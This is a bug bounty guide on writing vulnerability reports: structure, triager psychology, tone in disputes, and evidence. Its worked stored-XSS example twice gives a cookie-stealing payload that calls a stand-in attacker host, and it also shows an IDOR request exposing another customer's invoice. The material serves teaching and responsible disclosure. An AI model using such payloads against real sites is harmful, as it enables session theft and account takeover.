# Report Writing

> tags: reporting, intermediate

> related: Reporting/Impact-Statements, Reporting/Report-Templates, Reporting/Responsible-Disclosure

Report Writing
A bad report on a valid finding gets triaged slowly, downgraded, or ignored. I've seen critical bugs get marked as informational because the researcher couldn't explain what the impact was. The vulnerability is only half the work. The report is the other half.
Anatomy of a Great Report
Every good report has these sections, in this order:
Title, Summary, Environment, Reproduction Steps, Impact, Evidence, Suggested Fix

Title
The title is the first thing a triager reads. It needs to tell them exactly what's wrong, where it is, and why it matters, in one line.
Bad: XSS found on login page
Bad: Reflected Cross-Site Scripting
Good: Stored XSS in profile bio field allows arbitrary script execution in victim sessions
Good: IDOR on /api/v2/invoices/{id} exposes any customer's billing records
Formula: [Vuln Type] in [specific location] allows [what an attacker can do]

Summary
Two sentences. First sentence: what the vulnerability is and where. Second sentence: what an attacker can do with it, in business terms. No jargon that a product manager wouldn't understand.

Environment

URL(s) affected
Browser/client if relevant
Your test account info (never real user data)
Date/time of test


Reproduction Steps
Numbered. Exact. Reproducible by someone who wasn't there. If a triager can't reproduce it in under 10 minutes from your steps, you've failed.
Rules:

Use exact URLs, not "navigate to the settings page"
Include exact payloads, not "enter an XSS payload"
Note any required account state (logged in, specific role, specific object ownership)
If timing matters, say so
One action per step


Impact
This is where most researchers leave money on the table. "An attacker could execute arbitrary JavaScript" is a technical observation, not an impact statement. Impact is what happens to the business or user.
Ask yourself: what's the worst realistic thing an attacker does with this? Account takeover? Data exfiltration? Session hijacking? Financial fraud? Then say that.
See Impact Statements for templates and before/after examples.

Evidence

Screenshots of the vulnerability demonstrated
Raw HTTP request/response (Burp, not browser screenshots of dev tools)
Video for complex or timing-sensitive bugs
If you exfiltrated anything to prove the bug, use your own account's data only


Suggested Fix
Optional, but it builds credibility. Don't over-engineer it. A one or two sentence fix recommendation is enough. If you know the underlying cause, say it.

Complete Example: Stored XSS in Profile Bio
Title: Stored XSS in profile bio field allows arbitrary script execution in any visitor's session
Summary: The profile bio field at app.example.com/settings/profile does not sanitize HTML input before storing and rendering it. Any user who views the affected profile will execute attacker-controlled JavaScript in their browser session.
Environment:

Affected URL: app.example.com/settings/profile
Profile view URL: app.example.com/u/{username}
Tested: 2025-11-14, Chrome 130, Firefox 132
Attacker account: attacker_test@example.com
Victim account: victim_test@example.com

Reproduction Steps:

Log in to app.example.com as any user
Navigate to app.example.com/settings/profile
In the "Bio" field, enter the following payload:
<img src=x onerror="fetch('attacker.com/steal#039;+document.cookie)">

Click "Save Profile"
Log out and log in as a different user (or use a second browser)
Navigate to app.example.com/u/{attacker_username}
Observe the attacker's fetch request fires in the victim's browser, sending session cookies to the attacker's server

Impact: Any authenticated user who visits a profile with a malicious bio will have their session cookie exfiltrated to attacker-controlled infrastructure. This allows full account takeover without any user interaction beyond viewing a profile. Given that profiles are linked throughout the platform (comments, mentions, leaderboards), the attack surface for unsuspecting victims is broad. This affects all user roles including administrators.
Evidence:

Screenshot 1: Payload entered in bio field
Screenshot 2: Burp request showing payload stored in response
Screenshot 3: Victim browser console showing cookie sent to attacker server
HTTP Request (stored):
POST /api/profile HTTP/1.1
Host: app.example.com
...
{"bio":"<img src=x onerror=\"fetch('attacker.com/steal#039;+document.cookie)\">"}


Suggested Fix: Apply HTML entity encoding or a strict allowlist sanitizer (e.g., DOMPurify) to the bio field before storage. Do not rely on output encoding alone since the field is rendered as HTML. Consider a Content Security Policy as defense-in-depth.

Triager Psychology
A triager at a mid-sized programme might see 50-200 reports a day. They have roughly 10 minutes per report before the queue backs up. That's the budget you're working with.
What a triager needs in those 10 minutes: understand the vulnerability, reproduce it, assign a severity, and decide whether to escalate. Every minute you make them spend hunting for the reproduction URL, decoding your payload, or inferring the impact from vague language is a minute they resent spending on your report.
The practical consequence: if they can't reproduce in 10 minutes, the report gets deferred. Deferred reports get forgotten. You get a slower payout or a "can you provide more details?" response that costs both of you another week.
Write for the tired, time-pressed triager who has seen 40 other reports today. Give them a single-page brief that answers: what is it, where is it, how do I reproduce it, what can an attacker do. Anything beyond that is supporting evidence, not the main event.
Tone matters more than researchers expect. Reports that read as calm, precise, and professional get triaged faster. Reports that read as impatient, demanding, or accusatory get deprioritised  -  even when the vulnerability is real. The triager isn't your adversary. They're the person deciding whether to pay you.
Tone Under Dispute
Sometimes a valid report gets an N/A or a "not a security issue" response that's clearly wrong. This happens. How you reply determines whether you get a second look or get quietly ignored.
What to do:

Wait 24 hours before responding. The immediate reply is almost always too emotional to be useful.
Acknowledge their position without agreeing: "I understand the concern is about exploitability in practice."
Provide the one piece of evidence that changes the picture. Not a list of reasons  -  one clear demonstration.
End with a specific ask: "Would you be willing to reopen if I can demonstrate session hijacking from this XSS?"

Template phrases that work:

"To clarify the impact: I was able to [specific action] using this vulnerability, not just [what they think the impact is]."
"I may have under-explained the attack chain. Let me walk through the full path."
"I've put together a more detailed PoC that shows [specific impact]  -  happy to share if that would help re-evaluate."

What to avoid:

"This is clearly a P1 and your triage is wrong."
Pasting in CVSS scores without context.
Comparing the programme unfavourably to others.
Going silent and then escalating to public disclosure as a pressure tactic.

The goal of a dispute reply is to give the triager a reason to look again, not to win an argument.
Handling Duplicate and N/A Objections
Duplicates  -  if you're marked as a duplicate, ask for the original report number. Most programmes will provide it once the original is resolved. If the original is already resolved and you found it independently, some programmes will pay a partial reward; others won't. Know the programme's policy before arguing.
If you genuinely believe you're not a duplicate  -  different parameter, different endpoint, different attack chain  -  explain that specifically. "I found the same class of vulnerability at a different location in the application" is a valid distinction.
N/A objections  -  the two most common N/A reasons:


"We can't reproduce it"  -  provide a screen recording. Not a screenshot. A video that shows every click and every request, with Burp open in split screen. Make it impossible not to reproduce.


"This requires X condition that we don't consider exploitable"  -  address the condition directly. If they say "this requires the victim to be authenticated," show that authenticated users are in fact the target (e.g. the attacker could exploit other authenticated users, not just themselves).


When to accept the N/A and move on: if the programme has explicitly excluded the vulnerability class in their policy, arguing rarely changes the outcome. Read the policy first, accept the result, learn for the next submission.
When to escalate: if a programme repeatedly mislabels clear vulnerabilities or refuses to engage with evidence, note it in community feedback channels (e.g. programme reputation on HackerOne). Don't threaten disclosure  -  that poisons the relationship and is against most programme policies.
The Retitling Trick
A report can stall for weeks with no triage activity. One technique that sometimes breaks the logjam: retitle the report with sharper impact framing.
The original title might be: XSS in user profile settings
A retitled version: Stored XSS in profile bio allows session hijacking of any visiting user
You're not changing the vulnerability. You're making the severity legible in the title itself, which is the only part of the report that's visible in the triager's queue view. A title that telegraphs "high severity" gets looked at before one that reads as generic.
The retitle should be accurate  -  don't inflate. But if your title undersells the impact, fix it. A stored XSS that affects admins is different from one that affects regular users, and your title should say so.
Use this sparingly. One retitle after 2-3 weeks of no response is reasonable. Changing the title repeatedly looks like you're gaming the queue.
Evidence Priorities
Different vulnerability types call for different primary evidence.
HTTP request/response pairs from Burp  -  the right choice for almost all server-side vulnerabilities. Screenshots of DevTools are harder to read, easier to misinterpret, and can't be replayed. A raw Burp request can be copy-pasted into Repeater and confirmed in seconds.
# This is triager-friendly
GET /api/v2/invoices/9999 HTTP/1.1
Host: app.target.com
Authorization: Bearer VICTIM_TOKEN
 
HTTP/1.1 200 OK
Content-Type: application/json
 
{"invoice_id": 9999, "amount": "4299.00", "customer": "victim@example.com"}
Screenshots  -  useful for showing the visual impact of client-side bugs (XSS execution, UI redressing, content injection). Should show the payload in the input, the URL bar, and the executed output in the same frame where possible. Annotate with arrows or boxes if the relevant part isn't obvious.
Video  -  right for timing-sensitive or multi-step bugs where the sequence of events matters more than any single frame. Race conditions, CSRF chains, and complex login-flow bypasses are better demonstrated in 60 seconds of screen recording than in 15 screenshots. Keep videos under 3 minutes. Record at 1080p. Open Burp in a split view so network requests are visible throughout.
For blind vulnerabilities (blind XSS, blind SSRF)  -  your Burp Collaborator or XSS Hunter callback log is the primary evidence. Screenshot the callback showing the server IP, timestamp, and any exfiltrated data. Back it up with the payload and the endpoint you injected it into.

Related

Impact Statements
Report Templates
Responsible Disclosure
